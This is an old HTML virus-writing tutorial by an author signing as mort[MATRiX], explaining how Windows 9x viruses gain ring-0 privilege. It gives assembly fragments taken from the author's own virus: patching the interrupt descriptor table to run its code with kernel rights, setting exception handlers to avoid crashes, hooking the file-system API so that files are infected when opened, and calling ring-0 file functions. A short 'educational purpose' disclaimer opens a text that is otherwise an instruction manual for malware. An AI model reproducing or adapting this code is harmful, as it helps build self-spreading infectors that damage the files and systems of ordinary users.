<html>

<head>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
<title>Ring0 virii by mort/matrix</title>
</head>

<body bgcolor="#FFFFFF" text="#000000">

<p><img src="ring0.gif" width="311" height="23" alt="ring0.gif (4676 bytes)"></p>

<p><small><small><font face="Verdana"><br>
This text is for educational purpose only. Author is not responsibile for any damage this
informations could cause. Anyway, enjoy it,...<br>
<br>
I know, there're many articles 'bout this theme, anyway - here's next. And as allways
sorry for my english, and other possible bugs,...<br>
<br>
U know there's real mode and protected mode on 286+ . In real mode we are able to write
anywhere we want. Not in protected mode. Protected mode of Intel processors family (386+)
has four privilegue levels. This levels are called rings.<br>
<br>
Ring 0 - highest privilegue level<br>
Ring 1<br>
Ring 2<br>
Ring 3 - lowest privilegue level<br>
<br>
In windows world only Ring 0 and Ring 3 are used. I haven't found what happened with Ring
1 and 2, anyway, Ring 0 is system privilegue level and Ring 3 is for aplications. It
means, when our hostfile is executed,and we gotta chance with our virii, we are in ring 3.
So, our goal is to get into Ring 0. One way we can do it is via modifing IDT.<br>
<br>
IDT - interrupt descriptor table<br>
<br>
From DOS times (yeah, DOS's dead,..almost ;), u can remember there wastable of interrupt's
vectors. That was from 0:0 addres up to 0:0400h, coz we had 4 bytes for 256 interrupts.
IDT in PM is the same table like the one in DOS with some litle changes.<br>
<br>
First, IDT can be anywhere in memory. The base addres of it is store in IDTR (interrupt
descriptor table register). To read IDTR we use SIDT instruction (store interrupt
descriptor table).<br>
<br>
eg. <br>
.386p ;u've to include 'p'<br>
<br>
.data<br>
_IDTR dp ?<br>
.code<br>
SIDT [_IDTR] <br>
<br>
IDTR is 6 bytes long. One part is 16-bit long limit and the second and important for us is
base addres stored in 32-bit.<br>
<br>
Second main diference is in interrupt's record in IDT. In DOS there's for each interrupt
segment:offset record. In win32 (maybe, i can say in 386+ protected mode) world there's 8
bytes long record for each interrupt. <br>
<br>
IDT structure<br>
<br>
<pre>          .-------------------->   .------( limit )------.
          |                        |                     |
          |                        |---------------------|
          |
     IDTR |                              ............
          |
   .---------------------.         |                     |
   | limit |    base     |         |---------------------|
   '---------------------'         |      int rec.       |-----.
                   |               |---------------------|     |
                   |               |                     |     |
                   '----------->   '---( base addres )---'     |
                                                               |
   .-----------------------------------------------------------'                                                              
   |
  \ /
   '
    15                          0 15                          0
   .-----------------------------.-----------------------------.
   |   offset (31 - 16)          |        u neednt care        |
   |-----------------------------|-----------------------------|
   |   selector                  |      offset (15 - 0)        |
   '-----------------------------'-----------------------------'</pre>

<font color="#FF0000">reach ring 0<br>
</font><br>
The idea of ring 0 IDT viruses is to set one of interrupts on theirbody, and call this
interrupt by int xx instruction. Doing this, we are in ring 0, and we're going to be
bad,...<br>
<br>
U may notice, there's one disatvantage of this method. To modify IDT,we have to write in
to IDT and this is the problem, 'coz this is allowed only in w9x. So this method will fail
on win NT or 2k, bcoz IDT is protect there.Anyway, there're other methods to get into Ring
0 (eg kernel infection).<br>
<br>
i'll use fragment of my 2M virii,...<br>
<br>
@mm:<br>
pusha<br>
<br>
sub eax,offset @mm ;u know there's eip in eax,...<br>
pushf<br>
xchg ebp,eax<br>
<br>
lea eax,[ebp + @returnSEH] ;see in SEH sec. of this article<br>
push eax <br>
push dword ptr fs:[0]<br>
mov fs:[0],esp<br>
<br>
push eax ;store IDTR to stack <br>
sidt [esp - 2]<br>
pop eax ;and load only base of IDT<br>
<br>
add eax,_exception*8 ;locate int we'll use<br>
xchg eax,esi ;and load old int. addres<br>
lodsd<br>
xchg eax,ebx<br>
lodsd<br>
xchg ax,bx ;old int addres now in eax<br>
<br>
push eax <br>
<br>
lea eax,[ebp + @r0] ;our int routine<br>
sub esi,8 ;setting new addres of int<br>
xchg esi,edi <br>
push edi<br>
stosw<br>
shr eax,010h<br>
add edi,4<br>
stosw ;done<br>
<br>
Now, we have some interrupt set to point to our code. There's nothingleft then call int
instruction,...<br>
------------------------------------------------------------------------------------------------------------------<br>
<br>
int _exception ;let's fan begin<br>
<br>
pop edi ;set old exception<br>
pop eax<br>
stosw<br>
add edi,4<br>
shr eax,010h<br>
stosw<br>
<br>
xchg esi,ecx ;see in SEH sec. of this article<br>
lodsb <br>
<br>
@returnSEH:<br>
mov esp,[esp + 8]<br>
pop dword ptr fs:[0]<br>
pop edx<br>
...<br>
<br>
<br>
<font color="#FF0000">SEH - structured exception handler</font><br>
<br>
SEH is new win32 feature to protect applications from exceptions. (comment - maybe thats
not exatly definition, but i think, i reached the main idea,...) Using SEH in virii is
very usefull, bcoz we're playing with hot things in system, and when some error occurs, we
can continue without blue screens.<br>
<br>
When process is loaded fs:[0] points to the SEH. We save old handler and set up our own.
The SEH structure, we need to define, is this:<br>
<br>
_oldSEH dd ? <br>
_newSEH dd ?<br>
<br>
To _oldSEH field we have to store DWORD from fs:[0] location.<br>
To _newSEH field we store offset of our error - routine.<br>
<br>
mov eax,dword ptr fs:[0]<br>
mov [_oldSEH],eax<br>
mov eax,offset @errorLabel<br>
mov [_newSEH],eax<br>
<br>
And finally, we have to set addres of this struc to fs:[0].<br>
<br>
mov eax,offset _oldSEH<br>
mov dword ptr fs:[0],eax<br>
<br>
When virii finish its work, we have to set old SEH addres to fs:[0] and maybe clear the
stack if we're using it for new SEH like in my 2M virii (and many others,...).<br>
<br>
<font color="#FF0000">ring 0 funcs<br>
</font><br>
Well, assume we're in ring 0 now. To call some funcs we've to use some 'strange' code in
our virri.<br>
<br>
push param1 ;params are pushed before calling mostly<br>
...<br>
push paramK<br>
<br>
int 020h <br>
dw _funcNumber<br>
dw _vxdNumber<br>
<br>
pop paramK ;very usefull, coz params stay in stack<br>
...<br>
pop param1<br>
<br>
<br>
There's one very important thing about using this calling. When we first call some vxd
func, the code i mentioned will be replaced by 6 - bytes long call to func we called. I
heard it's done by this way to save time. Ayway, if we're coding virri, we 'mostly' need
copy our body to other files. So our code musn't be corrupted.There're many ways of fixing
our code. U can save the right values of vxd calling and their offsets and before copying
replace corrupted code to ours, or u can use some proc to call vxd (like in my 2M,...).<br>
<br>
Well, first we need is to allocate some space for our virri and copy it there, bcoz we're
still in hostfile. <br>
<br>
<font color="#FF0000">GetHeap service</font><br>
<br>
push memory_size<br>
<br>
int 20h <br>
dw 0dh <br>
dw 040h<br>
<br>
pop ebx ;clear stack<br>
<br>
returns memory addres in EAX<br>
-----------------------------------<br>
<br>
Now, we would like to watch func like opening file and so on. We can achieve this by
calling InstallFileSystemAPIhook func. There's one param to call this func - offset of
FS_API_hook and output is old FS_API_hook, which we have to call in our new FS_API_hook to
close thecircle (like in TSR under DOS).<br>
<br>
<font color="#FF0000">InstallFileSystemAPIhook</font><br>
<br>
lea eax,offset ourFS_API_hook<br>
push eax<br>
<br>
int 020h<br>
dw 067h <br>
dw 040h<br>
<br>
pop ebx ;clear stack<br>
<br>
mov [_oldFAPI],eax<br>
<br>
<br>
Now, i'll show an example of FSAPI_hook procedure. Well, the layout i'll show u is very
common and u can find it in many virusses include my 2M (haleluja LordJulus). <br>
<br>
FileSystemAPIHook important params:<br>
--------------------------------------------<br>
esp + 01ch - addres of IOREQ struc <br>
esp + 010h - drive specification of file <br>
esp + 0ch - action (like file open,...)<br>
<br>
In my 2M virii i check only for open_file action, anyway, if u'd like see some other
actions see Appendix A part of this article.<br>
<br>
ourFS_API_hook:<br>
<br>
push ebp ;C rools<br>
mov ebp,esp<br>
sub esp,020h<br>
<br>
push edi<br>
<br>
mov edi,012345678h ;delta offset of new allocated mem<br>
_newHandle equ $ - 4<br>
<br>
Now we have to check if we aren't allready in infect code, bcoz we cant reentry this part
of code. _dead variable is set in entering this part of code, and unset when leaving.<br>
----------------------------------------------------------------------<br>
cmp word ptr [edi + _dead],0deadh <br>
jz @busyNow <br>
<br>
----------------------------------------------------------------------<br>
And now check if the action is opening file,...<br>
----------------------------------------------------------------------<br>
cmp dword ptr [ebp + 0ch],IFSFN_OPEN<br>
jnz @busyNow<br>
<br>
call @tryInfect ;well,...<br>
<br>
@busyNow:<br>
mov eax,[ebp + 01ch] ;set the stack like the old one<br>
push eax<br>
mov eax,[ebp + 018h]<br>
push eax<br>
mov eax,[ebp + 014h]<br>
push eax<br>
mov eax,[ebp + 010h]<br>
push eax<br>
mov eax,[ebp + 0ch]<br>
push eax<br>
mov eax,[ebp + 08h]<br>
push eax<br>
<br>
mov eax,012345678h ;old FAPI addres<br>
_oldFAPI equ $ - 4<br>
call dword ptr [eax] ;and calling it<br>
<br>
pop edi ;clear stack<br>
<br>
add esp,018h<br>
leave<br>
ret ;and leave<br>
----------------------------------------------------------------------------<br>
<br>
<br>
IOREQ structure is pretty large structure, so i wont discus it here, bcoz it's not the
point of this article (heh), anyway u can check it elsewhere. One thing i'll show is
getting the name of file from it.<br>
<br>
mov esi,[ebp + 01ch] ;addres of IOREQ<br>
add esi,0ch ;addres of name <br>
lodsd <br>
add eax,4 ;point to name<br>
<br>
Name is in UNICODE so we 've to skip some trush before name, and then<br>
convert to ASCIIZ.<br>
<br>
---[UniToBCSPath]-----------------------------------------------------------<br>
<br>
push 0<br>
push max_length<br>
push source_addres ;offset of UNICODE name<br>
push destination_addres ;offset of buffer to be ASCIIZ name<br>
<br>
int 020h<br>
dw 041h<br>
dw 040h<br>
<br>
add esp,010h ;clear stack<br>
----------------------------------------------------------------------------<br>
<br>
<br>
Be4 converting we should check drive specification of file - esp+010h param from
FSAPIhook. If this param is 0ffh then no path is included and we're going to convert the
name. Anyway if not, then 1='A',2='B'.. We have to add this drive spec infront of the
destination buffer param from convert func,...(english sux,...;) Better to see the code.<br>
<br>
So, we have the filename - we can infect. To do it we need some funcs for working with
files. This service is called Ring0_FileIO and it's a little bit different from the others
we've allready used, bcoz params are stored in registers. And EAX reg holds the value of
function to be performed. It 's like in DOS where we had int 21h and params in &nbsp;
registers,...<br>
<br>
<font color="#FF0000">Ring0_FileIO</font><br>
<br>
mov reg,param<br>
...<br>
int 020h<br>
dw 032h <br>
dw 040h<br>
<br>
I'll mention only the main functions, naturally there're many of them.Number of functions
see in appendix B section of this article.<br>
<br>
.opening file eax - R0_OPENCREATFILE<br>
------------- esi - offset of file name<br>
bx - 2<br>
cx - 0<br>
dx - 1<br>
returns CF = 0 -&gt; eax - FileHandle<br>
CF = 1 -&gt; bad<br>
<br>
.reading file eax - R0_READFILE<br>
------------- esi - offset of buffer to read to<br>
ebx - FileHandle<br>
ecx - number of bytes to read <br>
edx - pointer of file to read from<br>
<br>
.writing file eax - R0_WRITEFILE<br>
------------- esi - offset of buffer to write from<br>
ebx - FileHandle <br>
ecx - number of bytes to write<br>
edx - pointer of file to write to<br>
<br>
.closing file eax - R0_CLOSEFILE<br>
------------- ebx - FileHandle<br>
<br>
.seek in file well, if u think this func is needed u r lazy reader:) <br>
------------- ...check read and write funcs...<br>
<br>
<br>
<font color="#FF0000">closing</font><br>
<br>
Well, thats all,...<br>
<br>
<font color="#FF0000">mort[MATRiX]</font><br>
<br>
email - mort.matrix@post.cz<br>
site - http://alterns.org/mvx<br>
<br>
---( appendix A )-----------------------------------------------------------<br>
<br>
IFSFN_READ EQU 0<br>
IFSFN_WRITE EQU&nbsp;&nbsp;&nbsp; 1<br>
IFSFN_FINDNEXT EQU 2<br>
IFSFN_FCNNEXT EQU 3<br>
IFSFN_SEEK EQU 10<br>
IFSFN_CLOSE EQU 11<br>
IFSFN_COMMIT EQU 12<br>
IFSFN_FILELOCKS EQU 13<br>
IFSFN_FILETIMES EQU 14<br>
IFSFN_PIPEREQUEST EQU 15<br>
IFSFN_HANDLEINFO EQU 16<br>
IFSFN_ENUMHANDLE EQU 17<br>
IFSFN_FINDCLOSE EQU 18<br>
IFSFN_FCNCLOSE EQU 19<br>
IFSFN_CONNECT EQU 30<br>
IFSFN_DELETE EQU 31<br>
IFSFN_DIR EQU 32<br>
IFSFN_FILEATTRIB EQU 33<br>
IFSFN_FLUSH EQU 34<br>
IFSFN_GETDISKINFO EQU 35<br>
IFSFN_OPEN EQU 36<br>
IFSFN_RENAME EQU 37<br>
IFSFN_SEARCH EQU 38<br>
IFSFN_QUERY EQU 39<br>
IFSFN_DISCONNECT EQU 40<br>
IFSFN_UNCPIPEREQ EQU 41<br>
IFSFN_IOCTL16DRIVE EQU 42<br>
IFSFN_GETDISKPARMS EQU 43<br>
IFSFN_FINDOPEN EQU 44<br>
IFSFN_DASDIO EQU 45<br>
<br>
---( appendix B )-----------------------------------------------------------<br>
<br>
R0_OPENCREATFILE equ 0d500h<br>
R0_OPENCREAT_IN_CONTEXT&nbsp;&nbsp;&nbsp; equ 0d501h<br>
R0_READFILE equ 0d600h<br>
R0_WRITEFILE equ 0d601h<br>
R0_READFILE_IN_CONTEXT equ 0d602h<br>
R0_WRITEFILE_IN_CONTEXT equ 0d603h<br>
R0_CLOSEFILE equ 0d700h<br>
R0_GETFILESIZE equ 0d800h<br>
R0_FINDFIRSTFILE equ 04e00h<br>
R0_FINDNEXTFILE equ 04f00h<br>
R0_FINDCLOSEFILE equ 0dc00h<br>
R0_FILEATTRIBUTES equ 04300h<br>
R0_RENAMEFILE equ 05600h<br>
R0_DELETEFILE equ 04100h<br>
R0_LOCKFILE&nbsp;&nbsp;&nbsp; equ 05c00h<br>
R0_GETDISKFREESPACE equ 03600h<br>
R0_READABSOLUTEDISK equ 0dd00h<br>
R0_WRITEABSOLUTEDISK equ 0de00h<br>
R0_HANDLETOPATH equ 0ec00h<br>
R0_MAPCACHEBLOCK equ 0ed00h<br>
R0_GETVOLLOCKLEVEL equ 0ee00h<br>
<br>
</font></small></small></p>
</body>
</html>
